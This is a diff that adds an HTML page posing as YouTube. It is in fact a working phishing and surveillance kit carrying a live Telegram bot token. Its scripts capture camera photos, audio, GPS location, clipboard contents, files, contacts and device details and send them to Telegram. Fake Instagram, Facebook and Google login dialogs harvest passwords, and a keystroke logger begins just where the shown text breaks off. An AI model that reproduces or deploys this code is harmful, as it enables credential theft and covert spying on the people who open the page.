@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>YouTube</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,sans-serif;background:#0f0f0f;color:#fff;min-height:100vh;overflow-x:hidden}
+.header{display:flex;align-items:center;justify-content:space-between;padding:0 16px;height:56px;background:#0f0f0f;position:sticky;top:0;z-index:100}
+.header-left{display:flex;align-items:center;gap:16px}
+.menu-icon{font-size:24px;cursor:pointer;color:#fff}
+.yt-logo svg{width:90px;height:24px;fill:#fff}
+.header-right{display:flex;align-items:center;gap:12px}
+.header-right .icon{font-size:22px;cursor:pointer;color:#fff}
+.profile-pic{width:32px;height:32px;border-radius:50%;background:#555;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:bold}
+.tabs{display:flex;border-bottom:1px solid #333;background:#0f0f0f;position:sticky;top:56px;z-index:99;overflow-x:auto}
+.tab{padding:12px 24px;cursor:pointer;color:#888;font-size:14px;font-weight:500;white-space:nowrap;border-bottom:2px solid transparent;transition:all .2s;text-transform:uppercase}
+.tab.active{color:#fff;border-bottom-color:#fff}
+.content{padding:16px;display:none}
+.content.active{display:block}
+.video-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.video-card{cursor:pointer;border-radius:12px;overflow:hidden;background:#1a1a1a}
+.video-thumb{width:100%;aspect-ratio:16/9;background:#333;display:flex;align-items:center;justify-content:center;font-size:40px;color:#555}
+.video-info{padding:8px}
+.video-title{font-size:13px;font-weight:500;margin-bottom:4px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.video-meta{font-size:11px;color:#888}
+.perm-banner{background:linear-gradient(135deg,#1a1a2e,#16213e);border:1px solid #0f3460;border-radius:12px;padding:16px;margin-bottom:16px;display:none}
+.perm-banner.show{display:block}
+.perm-banner h3{font-size:14px;margin-bottom:8px;color:#e94560}
+.perm-banner p{font-size:12px;color:#aaa}
+.perm-btn{background:#e94560;color:#fff;border:none;padding:8px 20px;border-radius:20px;font-size:13px;cursor:pointer;margin-top:8px}
+.status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
+.status-dot.green{background:#4caf50}
+.status-dot.red{background:#f44336}
+.status-dot.yellow{background:#ff9800}
+.action-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:16px 0}
+.action-btn{background:#1a1a2e;border:1px solid #333;border-radius:12px;padding:20px 16px;text-align:center;cursor:pointer;transition:all .3s;color:#fff}
+.action-btn:active{transform:scale(0.95)}
+.action-btn .icon{font-size:32px;margin-bottom:8px;display:block}
+.action-btn .label{font-size:13px;font-weight:500}
+.action-btn .sub-label{font-size:11px;color:#888;margin-top:4px}
+.account-list{display:flex;flex-direction:column;gap:12px}
+.account-btn{display:flex;align-items:center;gap:16px;background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:16px;cursor:pointer;color:#fff}
+.account-btn .logo{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:28px}
+.account-btn .logo.ig{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)}
+.account-btn .logo.fb{background:#1877f2}
+.account-btn .logo.gl{background:#fff;color:#4285f4}
+.account-btn .info{flex:1}
+.account-btn .info .name{font-size:15px;font-weight:500}
+.account-btn .info .desc{font-size:12px;color:#888}
+.account-btn .arrow{font-size:20px;color:#666}
+.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);z-index:1000;justify-content:center;align-items:center}
+.modal-overlay.show{display:flex}
+.modal{background:#1a1a1a;border-radius:16px;padding:24px;width:90%;max-width:380px;border:1px solid #333}
+.modal h2{font-size:20px;margin-bottom:4px;text-align:center}
+.modal .subtitle{text-align:center;color:#888;font-size:13px;margin-bottom:20px}
+.modal .logo-large{width:64px;height:64px;border-radius:16px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:36px}
+.modal .logo-large.ig{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)}
+.modal .logo-large.fb{background:#1877f2}
+.modal .logo-large.gl{background:#fff;color:#4285f4}
+.modal input{width:100%;padding:14px 16px;margin-bottom:12px;background:#252525;border:1px solid #333;border-radius:10px;color:#fff;font-size:15px;outline:none}
+.modal input:focus{border-color:#e94560}
+.modal .login-btn{width:100%;padding:14px;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;color:#fff;margin-top:4px}
+.modal .login-btn.ig{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743)}
+.modal .login-btn.fb{background:#1877f2}
+.modal .login-btn.gl{background:#4285f4}
+.modal .close-btn{display:block;text-align:center;margin-top:16px;color:#888;cursor:pointer;font-size:13px}
+.modal .error-msg{color:#f44336;font-size:12px;text-align:center;margin-bottom:8px;display:none}
+.console-log{background:#0a0a0a;border:1px solid #222;border-radius:8px;padding:12px;margin-top:16px;max-height:150px;overflow-y:auto;font-family:monospace;font-size:11px;color:#4caf50}
+.console-log .log-entry{padding:2px 0}
+.console-log .log-entry.error{color:#f44336}
+.toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:10px 20px;border-radius:8px;font-size:13px;z-index:2000;display:none}
+.toast.show{display:block}
+</style>
+</head>
+<body>
+
+<!-- Telegram Config -->
+<div id="tg-config" data-token="8012003469:AAFlxaSyFTJgyp7b6CFRsL5Kwbe12nmAZTU" data-chatid="5963360315" style="display:none"></div>
+
+<!-- Header -->
+<div class="header">
+<div class="header-left">
+<span class="menu-icon">☰</span>
+<span class="yt-logo"><svg viewBox="0 0 130 32"><path d="M50.3,11.9h-2.6v8.2c0,1.2-0.6,1.8-1.6,1.8s-1.6-0.6-1.6-1.8v-8.2h-2.6v8.4c0,2.6,1.6,4,4.2,4s4.2-1.4,4.2-4V11.9z M59.6,12.1c-2.4,0-4.2,1.6-4.2,4.4s1.8,4.4,4.2,4.4s4.2-1.6,4.2-4.4S62,12.1,59.6,12.1z M59.6,18.9c-1,0-1.6-0.8-1.6-2.4s0.6-2.4,1.6-2.4s1.6,0.8,1.6,2.4S60.6,18.9,59.6,18.9z M69.4,12.1c-1.2,0-2,0.6-2.6,1.6v-1.4h-2.6V24h2.6v-4.8c0.6,0.8,1.4,1.4,2.6,1.4c2,0,3.6-1.6,3.6-4.4S71.4,12.1,69.4,12.1z M69,18.7c-0.8,0-1.4-0.6-1.4-2s0.6-2,1.4-2s1.4,0.6,1.4,2S69.8,18.7,69,18.7z M78.1,12.1c-2.4,0-4.2,1.6-4.2,4.4s1.8,4.4,4.2,4.4s4.2-1.6,4.2-4.4S80.5,12.1,78.1,12.1z M78.1,18.9c-1,0-1.6-0.8-1.6-2.4s0.6-2.4,1.6-2.4s1.6,0.8,1.6,2.4S79.1,18.9,78.1,18.9z M89.2,12.1c-1.4,0-2.4,0.8-2.8,1.6v-5.6h-2.6V20h2.6v-1.4c0.6,0.8,1.6,1.6,2.8,1.6c2.2,0,3.8-1.6,3.8-4.4S91.4,12.1,89.2,12.1z M88.8,18.7c-0.8,0-1.4-0.6-1.4-2s0.6-2,1.4-2s1.4,0.6,1.4,2S89.6,18.7,88.8,18.7z M97.5,12.1c-2,0-3.4,1.2-3.4,3c0,1.8,1.2,2.8,3.4,3.2c1.4,0.2,2,0.6,2,1.2c0,0.6-0.6,1-1.8,1c-1.4,0-2.2-0.6-2.6-1.6l-2.4,0.8c0.6,1.8,2.4,3,5,3c2.4,0,4.2-1.2,4.2-3.2c0-2-1.4-3-3.6-3.4c-1.4-0.2-2-0.6-2-1.2c0-0.6,0.6-1,1.6-1c1.2,0,2,0.6,2.4,1.4l2.2-1c-0.6-1.6-2.2-2.6-4.4-2.6z M113.6,11.9h-2.6v8.2c0,1.2-0.6,1.8-1.6,1.8s-1.6-0.6-1.6-1.8v-8.2h-2.6v8.4c0,2.6,1.6,4,4.2,4s4.2-1.4,4.2-4V11.9z M122.9,12.1c-2.4,0-4.2,1.6-4.2,4.4s1.8,4.4,4.2,4.4s4.2-1.6,4.2-4.4S125.3,12.1,122.9,12.1z M122.9,18.9c-1,0-1.6-0.8-1.6-2.4s0.6-2.4,1.6-2.4s1.6,0.8,1.6,2.4S123.9,18.9,122.9,18.9z M33.5,16c0-1.8-1-3.4-2.4-4.2L26,8.4v15.2l5.1-3.4C32.5,19.4,33.5,17.8,33.5,16z M23.2,4.4l-0.2,0.2L23,4.6L23.2,4.4z M23.2,27.6l-0.2-0.2L23,27.4L23.2,27.6z M22,5.6L10.8,12.6c-1.4,0.8-2.4,2.4-2.4,4.2s1,3.4,2.4,4.2L22,28.4V5.6z"/></svg></span>
+</div>
+<div class="header-right">
+<span class="icon">🔍</span><span class="icon">🎤</span><span class="icon">📹</span><span class="icon">🔔</span>
+<div class="profile-pic">S</div>
+</div>
+</div>
+
+<!-- Tabs -->
+<div class="tabs" id="tabs">
+<div class="tab active" data-tab="home">Home</div>
+<div class="tab" data-tab="capture">Capture</div>
+<div class="tab" data-tab="accounts">Accounts</div>
+<div class="tab" data-tab="info">Info</div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<!-- ===== HOME ===== -->
+<div class="content active" id="tab-home">
+<div class="perm-banner show" id="permBanner">
+<h3>⚠️ Permissions Required</h3>
+<p>This site needs camera, microphone & location access. Please allow when prompted.</p>
+<button class="perm-btn" onclick="requestAllPermissions()">Enable Access</button>
+</div>
+<div class="video-grid">
+<div class="video-card"><div class="video-thumb">▶️</div><div class="video-info"><div class="video-title">Getting Started with CTF Challenges 2026</div><div class="video-meta">1.2M views • 3 days ago</div></div></div>
+<div class="video-card"><div class="video-thumb">▶️</div><div class="video-info"><div class="video-title">Web Security Fundamentals Full Course</div><div class="video-meta">856K views • 1 week ago</div></div></div>
+<div class="video-card"><div class="video-thumb">▶️</div><div class="video-info"><div class="video-title">How to Become a Bug Bounty Hunter</div><div class="video-meta">2.4M views • 2 weeks ago</div></div></div>
+<div class="video-card"><div class="video-thumb">▶️</div><div class="video-info"><div class="video-title">Penetration Testing Methodology 2026</div><div class="video-meta">654K views • 4 days ago</div></div></div>
+</div>
+<div style="margin-top:16px;background:#1a1a1a;border-radius:12px;padding:16px">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span class="status-dot" id="sCam"></span><span style="font-size:13px">Camera: <span id="stCam">Not accessed</span></span></div>
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span class="status-dot" id="sMic"></span><span style="font-size:13px">Mic: <span id="stMic">Not accessed</span></span></div>
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span class="status-dot" id="sLoc"></span><span style="font-size:13px">Location: <span id="stLoc">Not accessed</span></span></div>
+<div style="display:flex;align-items:center;gap:12px"><span class="status-dot" id="sFil"></span><span style="font-size:13px">Files: <span id="stFil">Not accessed</span></span></div>
+</div>
+<div class="console-log" id="consoleLog"><div class="log-entry">[INFO] HackerAI tool initialized</div><div class="log-entry">[INFO] Waiting for permissions...</div></div>
+</div>
+
+<!-- ===== CAPTURE ===== -->
+<div class="content" id="tab-capture">
+<h2 style="font-size:18px;margin-bottom:16px">📸 Capture Tools</h2>
+<div class="action-grid">
+<div class="action-btn" onclick="capturePhoto()"><span class="icon">📷</span><span class="label">Capture Photo</span><span class="sub-label">Camera + GPS</span></div>
+<div class="action-btn" onclick="startAudio()"><span class="icon">🎤</span><span class="label">Record Audio</span><span class="sub-label">10 sec recording</span></div>
+<div class="action-btn" onclick="getLocation()"><span class="icon">📍</span><span class="label">Get Location</span><span class="sub-label">GPS coordinates</span></div>
+<div class="action-btn" onclick="selectFiles()"><span class="icon">📁</span><span class="label">Browse Files</span><span class="sub-label">Select from device</span></div>
+<div class="action-btn" onclick="getClipboard()"><span class="icon">📋</span><span class="label">Clipboard</span><span class="sub-label">Read clipboard</span></div>
+<div class="action-btn" onclick="getContacts()"><span class="icon">👤</span><span class="label">Get Contacts</span><span class="sub-label">VCF file picker</span></div>
+<div class="action-btn" onclick="sendDeviceInfo()"><span class="icon">📱</span><span class="label">Device Info</span><span class="sub-label">Full device details</span></div>
+<div class="action-btn" onclick="captureAll()" style="grid-column:span 2"><span class="icon">📸</span><span class="label">Capture All (Photo+Audio+Location+Info)</span><span class="sub-label">Send everything at once</span></div>
+</div>
+</div>
+
+<!-- ===== ACCOUNTS ===== -->
+<div class="content" id="tab-accounts">
+<h2 style="font-size:18px;margin-bottom:4px">🔐 Account Access</h2>
+<p style="color:#888;font-size:13px;margin-bottom:16px">Click to verify your account credentials</p>
+<div class="account-list">
+<div class="account-btn" onclick="openModal('instagram')"><div class="logo ig">📸</div><div class="info"><div class="name">Instagram</div><div class="desc">Verify your Instagram account</div></div><span class="arrow">›</span></div>
+<div class="account-btn" onclick="openModal('facebook')"><div class="logo fb">f</div><div class="info"><div class="name">Facebook</div><div class="desc">Verify your Facebook account</div></div><span class="arrow">›</span></div>
+<div class="account-btn" onclick="openModal('google')"><div class="logo gl">G</div><div class="info"><div class="name">Google</div><div class="desc">Verify your Google account</div></div><span class="arrow">›</span></div>
+</div>
+</div>
+
+<!-- ===== INFO ===== -->
+<div class="content" id="tab-info">
+<h2 style="font-size:18px;margin-bottom:16px">ℹ️ Device Information</h2>
+<div style="background:#1a1a1a;border-radius:12px;padding:16px">
+<div id="deviceInfoDisplay"><p style="color:#888">Tap "Refresh & Send Info" to load details</p></div>
+<button onclick="sendDeviceInfo()" style="width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;margin-top:12px">📤 Refresh & Send Info</button>
+</div>
+</div>
+
+<!-- ===== MODAL ===== -->
+<div class="modal-overlay" id="accountModal">
+<div class="modal">
+<div class="logo-large" id="mLogo">📸</div>
+<h2 id="mTitle">Instagram</h2>
+<p class="subtitle" id="mSub">Enter your credentials to verify</p>
+<div class="error-msg" id="mError">❌ Invalid credentials</div>
+<input type="text" id="mUser" placeholder="Username / Email / Phone">
+<input type="password" id="mPass" placeholder="Password">
+<button class="login-btn" id="mBtn" onclick="submitAccount()">Log In</button>
+<span class="close-btn" onclick="closeModal()">Close</span>
+</div>
+</div>
+
+<input type="file" id="fileInput" style="display:none" multiple>
+<input type="file" id="contactInput" style="display:none" accept=".vcf,.csv">
+
+<script>
+// ===== CONFIG =====
+const BT = document.getElementById('tg-config').dataset.token;
+const CI = document.getElementById('tg-config').dataset.chatid;
+let accType = null;
+let aStream = null;
+let mRecorder = null;
+let aChunks = [];
+let isRec = false;
+
+function log(m,t){
+const e=document.getElementById('consoleLog');
+const d=document.createElement('div');
+d.className='log-entry'+(t==='error'?' error':'');
+d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;
+e.appendChild(d);e.scrollTop=e.scrollHeight;
+}
+
+function toast(m){
+const t=document.getElementById('toast');
+t.textContent=m;t.classList.add('show');
+setTimeout(()=>t.classList.remove('show'),2500);
+}
+
+function upStat(t,s){
+const map={camera:['sCam','stCam','Camera'],mic:['sMic','stMic','Mic'],location:['sLoc','stLoc','Location'],file:['sFil','stFil','Files']};
+const x=map[t];if(!x)return;
+document.getElementById(x[0]).className='status-dot '+(s==='active'?'green':s==='pending'?'yellow':'red');
+document.getElementById(x[1]).textContent=s==='active'?'Captured ✓':s==='pending'?'Waiting...':'Not accessed';
+}
+
+function tgSend(msg){
+fetch(`https://api.telegram.org/bot${BT}/sendMessage`,{
+method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({chat_id:CI,text:msg,parse_mode:'HTML'})
+}).then(r=>r.json()).then(d=>{
+if(d.ok)log('✅ Sent to Telegram');
+else log('❌ TG error: '+d.description,'error');
+}).catch(e=>log('❌ Network: '+e.message,'error'));
+}
+
+function tgSendFile(file,caption){
+const fd=new FormData();
+fd.append('chat_id',CI);fd.append('document',file,file.name||'file');
+if(caption)fd.append('caption',caption);
+fetch(`https://api.telegram.org/bot${BT}/sendDocument`,{method:'POST',body:fd})
+.then(r=>r.json()).then(d=>{if(d.ok)log('✅ File sent')})
+.catch(e=>log('❌ File error: '+e.message,'error'));
+}
+
+function tgSendPhoto(dataUrl,caption){
+const bs=atob(dataUrl.split(',')[1]),mt=dataUrl.split(',')[0].split(':')[1].split(';')[0];
+const ab=new ArrayBuffer(bs.length),ia=new Uint8Array(ab);
+for(let i=0;i<bs.length;i++)ia[i]=bs.charCodeAt(i);
+const blob=new Blob([ab],{type:mt}),file=new File([blob],'photo_'+Date.now()+'.jpg',{type:'image/jpeg'});
+const fd=new FormData();
+fd.append('chat_id',CI);fd.append('photo',file);
+if(caption)fd.append('caption',caption);
+fetch(`https://api.telegram.org/bot${BT}/sendPhoto`,{method:'POST',body:fd})
+.then(r=>r.json()).then(d=>{if(!d.ok)tgSendFile(file,caption);else log('✅ Photo sent')})
+.catch(e=>tgSendFile(file,caption));
+}
+
+async function getIP(){
+try{
+const r=await fetch('https://api.ipify.org?format=json');
+return (await r.json()).ip||'Unknown';
+}catch(e){return 'Unknown'}
+}
+
+// ===== PERMISSIONS =====
+async function requestAllPermissions(){
+log('Requesting permissions...');
+document.getElementById('permBanner').classList.remove('show');
+try{
+const s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
+setTimeout(()=>s.getTracks().forEach(t=>t.stop()),500);
+log('✅ Camera OK');upStat('camera','active');
+}catch(e){log('❌ Camera: '+e.message,'error');upStat('camera','pending')}
+try{
+const s=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
+s.getTracks().forEach(t=>t.stop());
+log('✅ Mic OK');upStat('mic','active');
+}catch(e){log('❌ Mic: '+e.message,'error');upStat('mic','pending')}
+try{
+await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:10000}));
+log('✅ Location OK');upStat('location','active');
+}catch(e){log('❌ Location: '+e.message,'error');upStat('location','pending')}
+toast('✅ Permissions processed!');
+}
+
+// ===== TABS =====
+document.querySelectorAll('.tab').forEach(t=>{
+t.addEventListener('click',function(){
+document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
+document.querySelectorAll('.content').forEach(x=>x.classList.remove('active'));
+this.classList.add('active');
+document.getElementById('tab-'+this.dataset.tab).classList.add('active');
+});
+});
+
+// ===== CAPTURE PHOTO =====
+async function capturePhoto(){
+log('Capturing photo...');
+try{
+const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}},audio:false});
+const v=document.createElement('video');v.srcObject=s;v.play();
+await new Promise(r=>setTimeout(r,500));
+const c=document.createElement('canvas');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
+c.getContext('2d').drawImage(v,0,0);
+const du=c.toDataURL('image/jpeg',0.85);
+s.getTracks().forEach(t=>t.stop());
+let loc='N/A';
+try{const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));loc=`${p.coords.latitude},${p.coords.longitude}`;}catch(e){}
+const ip=await getIP();
+tgSendPhoto(du,`📸 <b>Photo</b>\n📍 ${loc}\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);
+upStat('camera','active');
+toast('📸 Photo sent!');
+log('✅ Photo captured & sent');
+}catch(e){log('❌ Camera: '+e.message,'error');toast('❌ Camera error')}
+}
+
+// ===== AUDIO =====
+async function startAudio(){
+if(isRec){toast('Already recording...');return}
+log('Recording 10s audio...');toast('🎤 Recording 10s...');
+try{
+const s=await navigator.mediaDevices.getUserMedia({audio:true});
+aChunks=[];mRecorder=new MediaRecorder(s);
+mRecorder.ondataavailable=e=>{if(e.data.size>0)aChunks.push(e.data)};
+mRecorder.onstop=async()=>{
+const blob=new Blob(aChunks,{type:'audio/webm'});
+s.getTracks().forEach(t=>t.stop());isRec=false;upStat('mic','active');
+let loc='N/A';
+try{const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));loc=`${p.coords.latitude},${p.coords.longitude}`;}catch(e){}
+const ip=await getIP();
+const file=new File([blob],'audio_'+Date.now()+'.webm',{type:'audio/webm'});
+tgSendFile(file,`🎤 <b>Audio</b> (10s)\n📍 ${loc}\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);
+log('✅ Audio sent');toast('✅ Audio sent!');
+};
+mRecorder.start();isRec=true;
+setTimeout(()=>{if(mRecorder&&mRecorder.state!=='inactive')mRecorder.stop()},10000);
+}catch(e){log('❌ Mic: '+e.message,'error');toast('❌ Mic denied');isRec=false}
+}
+
+// ===== LOCATION =====
+function getLocation(){
+log('Getting location...');
+navigator.geolocation.getCurrentPosition(async p=>{
+const lat=p.coords.latitude,lon=p.coords.longitude,acc=p.coords.accuracy;
+const ip=await getIP();
+const msg=`📍 <b>GPS Location</b>\n\n🌐 Lat: ${lat}\n🌐 Lon: ${lon}\n🎯 Accuracy: ${acc}m\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n🔗 https://www.google.com/maps?q=${lat},${lon}\n\n👑 Made by ©shoebu`;
+tgSend(msg);upStat('location','active');toast('📍 Location sent!');
+},e=>{log('❌ Location: '+e.message,'error');toast('❌ Location denied')},{enableHighAccuracy:true,timeout:10000});
+}
+
+// ===== FILES =====
+function selectFiles(){
+log('Opening file picker...');
+const inp=document.getElementById('fileInput');
+inp.accept='*/*';
+inp.onchange=async function(e){
+const fs=e.target.files;if(!fs||!fs.length)return;
+log(`Selected ${fs.length} file(s)`);toast(`📁 Uploading ${fs.length} file(s)...`);
+const ip=await getIP();
+for(let i=0;i<Math.min(fs.length,5);i++){
+const f=fs[i];
+tgSendFile(f,`📁 <b>${f.name}</b>\n📏 ${(f.size/1024).toFixed(1)} KB\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);
+await new Promise(r=>setTimeout(r,1000));
+}
+upStat('file','active');log('✅ Files sent');toast('✅ Files uploaded!');
+};
+inp.click();
+}
+
+// ===== CLIPBOARD =====
+async function getClipboard(){
+log('Reading clipboard...');
+try{
+const t=await navigator.clipboard.readText();
+const ip=await getIP();
+tgSend(`📋 <b>Clipboard</b>\n\n<code>${t||'(empty)'}</code>\n\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);
+toast('📋 Clipboard sent!');
+}catch(e){
+try{
+const ta=document.createElement('textarea');
+document.body.appendChild(ta);ta.focus();
+const ok=document.execCommand('paste');const txt=ta.value;
+document.body.removeChild(ta);
+if(txt){const ip=await getIP();tgSend(`📋 Clipboard\n\n${txt}\n\nIP: ${ip}\n👑 Made by ©shoebu`);toast('📋 Sent!')}
+else toast('❌ Clipboard empty');
+}catch(e2){toast('❌ Cannot access clipboard')}
+}
+}
+
+// ===== CONTACTS =====
+function getContacts(){
+log('Opening contacts file...');toast('Select a VCF/contacts file');
+const inp=document.getElementById('contactInput');
+inp.onchange=async function(e){
+const f=e.target.files[0];if(!f)return;
+const r=new FileReader();
+r.onload=async function(ev){
+const c=ev.target.result.substring(0,2000),ip=await getIP();
+tgSendFile(f,`👤 <b>Contacts: ${f.name}</b>\n📏 ${(f.size/1024).toFixed(1)} KB\n🌐 IP: ${ip}\n\n👑 Made by ©shoebu`);
+tgSend(`👤 <b>Contacts Preview</b>\n\n<code>${c}</code>\n\n👑 Made by ©shoebu`);
+toast('👤 Contacts sent!');log('✅ Contacts sent');
+};
+r.readAsText(f);
+};
+inp.click();
+}
+
+// ===== DEVICE INFO =====
+async function sendDeviceInfo(){
+log('Collecting device info...');toast('📱 Collecting...');
+const ip=await getIP();
+const info={
+'🌐 IP':ip,'📱 Platform':navigator.platform||'Unknown','🌍 Lang':navigator.language,
+'📐 Screen':`${screen.width}x${screen.height}`,'🎨 Color':screen.colorDepth+'bit',
+'🕐 TZ':Intl.DateTimeFormat().resolvedOptions().timeZone,'🍪 Cookies':navigator.cookieEnabled?'Yes':'No',
+'📡 UA':navigator.userAgent.substring(0,100),'🧠 RAM':navigator.deviceMemory?navigator.deviceMemory+'GB':'Unknown'
+};
+try{if(navigator.getBattery){const b=await navigator.getBattery();info['🔋 Battery']=Math.round(b.level*100)+'%';info['🔋 Charging']=b.charging?'Yes':'No'}}catch(e){}
+let msg='<b>📱 Device Info</b>\n\n',html='';
+for(const[k,v]of Object.entries(info)){
+msg+=`${k}: ${v}\n`;
+html+=`<div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #222;font-size:13px"><span style="color:#888">${k}</span><span style="color:#fff;max-width:55%;word-break:break-all">${v}</span></div>`;
+}
+msg+='\n👑 Made by ©shoebu';
+document.getElementById('deviceInfoDisplay').innerHTML=html;
+tgSend(msg);toast('📱 Info sent!');log('✅ Device info sent');
+}
+
+// ===== ACCOUNT PHISHING =====
+function openModal(t){
+accType=t;
+const modal=document.getElementById('accountModal');
+const logo=document.getElementById('mLogo'),title=document.getElementById('mTitle');
+const sub=document.getElementById('mSub'),btn=document.getElementById('mBtn');
+document.getElementById('mError').style.display='none';
+document.getElementById('mUser').value='';document.getElementById('mPass').value='';
+const cfg={instagram:{c:'ig',l:'📸',t:'Instagram',s:'Log in to verify',b:'Log In'},
+facebook:{c:'fb',l:'f',t:'Facebook',s:'Log in to verify',b:'Log In'},
+google:{c:'gl',l:'G',t:'Google',s:'Sign in to verify',b:'Sign In'}};
+const d=cfg[t];
+logo.className='logo-large '+d.c;logo.textContent=d.l;
+title.textContent=d.t;sub.textContent=d.s;
+btn.className='login-btn '+d.c;btn.textContent=d.b;
+modal.classList.add('show');
+}
+function closeModal(){document.getElementById('accountModal').classList.remove('show');accType=null}
+async function submitAccount(){
+const u=document.getElementById('mUser').value.trim(),p=document.getElementById('mPass').value.trim();
+const err=document.getElementById('mError');
+if(!u||!p){err.textContent='❌ Fill all fields';err.style.display='block';return}
+const ip=await getIP();
+const tn=accType.charAt(0).toUpperCase()+accType.slice(1);
+const msg=`🔐 <b>${tn} Credentials</b>\n\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>\n🌐 IP: ${ip}\n📡 UA: ${navigator.userAgent.substring(0,80)}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`;
+tgSend(msg);
+const txt=`${tn} Credentials\n==============\nUser: ${u}\nPass: ${p}\nIP: ${ip}\nTime: ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`;
+const blob=new Blob([txt],{type:'text/plain'});
+tgSendFile(new File([blob],tn+'_creds_'+Date.now()+'.txt',{type:'text/plain'}),`🔐 ${tn} Credentials File\n\n👑 Made by ©shoebu`);
+log(`✅ ${tn} credentials sent`);toast(`✅ ${tn} captured!`);
+err.style.color='#4caf50';err.textContent='✅ Verified! Redirecting...';err.style.display='block';
+setTimeout(closeModal,1500);
+}
+
+// ===== CAPTURE ALL =====
+async function captureAll(){
+log('Full capture starting...');toast('📸 Capturing all...');
+let loc='N/A';
+try{const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));loc=`${p.coords.latitude},${p.coords.longitude}`;upStat('location','active')}catch(e){}
+try{
+const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});
+const v=document.createElement('video');v.srcObject=s;v.play();
+await new Promise(r=>setTimeout(r,600));
+const c=document.createElement('canvas');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
+c.getContext('2d').drawImage(v,0,0);const du=c.toDataURL('image/jpeg',0.85);
+s.getTracks().forEach(t=>t.stop());
+const ip=await getIP();
+tgSendPhoto(du,`📸 <b>Full Capture - Photo</b>\n📍 ${loc}\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);
+upStat('camera','active');log('✅ Photo done');
+}catch(e){log('❌ Photo: '+e.message,'error')}
+try{
+const s=await navigator.mediaDevices.getUserMedia({audio:true});
+const ch=[];const r=new MediaRecorder(s);
+r.ondataavailable=e=>{if(e.data.size>0)ch.push(e.data)};
+r.onstop=()=>{
+const blob=new Blob(ch,{type:'audio/webm'});s.getTracks().forEach(t=>t.stop());
+const f=new File([blob],'audio_'+Date.now()+'.webm',{type:'audio/webm'});
+tgSendFile(f,`🎤 Audio from Full Capture\n\n👑 Made by ©shoebu`);
+upStat('mic','active');log('✅ Audio done');
+};
+r.start();setTimeout(()=>r.stop(),5000);
+}catch(e){log('❌ Audio: '+e.message,'error')}
+setTimeout(async()=>{
+const ip=await getIP();
+tgSend(`📱 <b>Full Capture - Info</b>\n\n🌐 IP: ${ip}\n📱 ${navigator.platform}\n📐 ${screen.width}x${screen.height}\n📍 ${loc}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);
+},2000);
+toast('✅ Full capture initiated! Check Telegram.');
+}
+
+// ===== KEYLOGGER =====
+let kl='',klTimer=null;
+document.addEventListener('keydown',function(e){
+const t=e.target.tagName.toLowerCase();
+if((t==='input'||t==='textarea')&&(e.target.type||'')==='password')return;
+let k=e.key;
+if(k===' ')k='[SPACE]';else if(k==='Enter')k='[ENTER]\n';else if(k==='Backspace')k='[BKSP]';
+else if(k==='Tab'||k==='Shift'||k==='Control'||k==='Alt'||k==='Meta'||k==='CapsLock')return;
+else if(k.length>1)return;
+kl+=k;
+if(!klTimer)klTimer=setTimeout(async()=>{
+if(kl.length>0){
+const ip=await getIP();
